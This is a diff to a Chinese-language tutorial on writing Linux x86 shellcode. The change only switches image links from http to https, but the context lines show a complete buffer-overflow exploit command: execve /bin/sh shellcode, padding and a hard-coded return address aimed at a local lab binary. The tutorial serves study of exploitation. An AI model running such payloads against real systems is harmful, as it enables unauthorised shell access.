@@ -28,7 +28,7 @@ int main(int argc, char** argv){
 ```
 编译：gcc -o shell shell.c
 运行：./shell
-![](http://ww4.sinaimg.cn/large/005CA6ZCjw1f9zy112hgwj30jg0443zh.jpg)
+![](https://ww4.sinaimg.cn/large/005CA6ZCjw1f9zy112hgwj30jg0443zh.jpg)
 新打开了一个shell。
 
 ## 1.2 分析
@@ -81,12 +81,12 @@ _start:
 连接：ld -o shellcode_execve shellcode_execve.o 
 运行：./shellcode_execve 
 
-![](http://ww2.sinaimg.cn/large/005CA6ZCgw1f9zytwty6yj30k3020gmf.jpg)
+![](https://ww2.sinaimg.cn/large/005CA6ZCgw1f9zytwty6yj30k3020gmf.jpg)
 
 ## 2.3 提出二进制码
 使用 objdump 提取二进制码：
 
-![](http://ww4.sinaimg.cn/large/005CA6ZCgw1f9zywv42rjj30jg09kq5w.jpg)
+![](https://ww4.sinaimg.cn/large/005CA6ZCgw1f9zywv42rjj30jg09kq5w.jpg)
 
 exploit 为 
 ```
@@ -128,7 +128,7 @@ $(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3
 ./level $(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"+"A"*115+"\x80\xef\xff\xbf"')
 ```
 
-![](http://ww4.sinaimg.cn/large/005CA6ZCgw1f9zz9tuh07j30k8069q4o.jpg)
+![](https://ww4.sinaimg.cn/large/005CA6ZCgw1f9zz9tuh07j30k8069q4o.jpg)
 
 # 4 参考文献
 - [linux下shellcode编写入门](http://www.cnblogs.com/Lamboy/archive/2012/07/31/2616103.html)
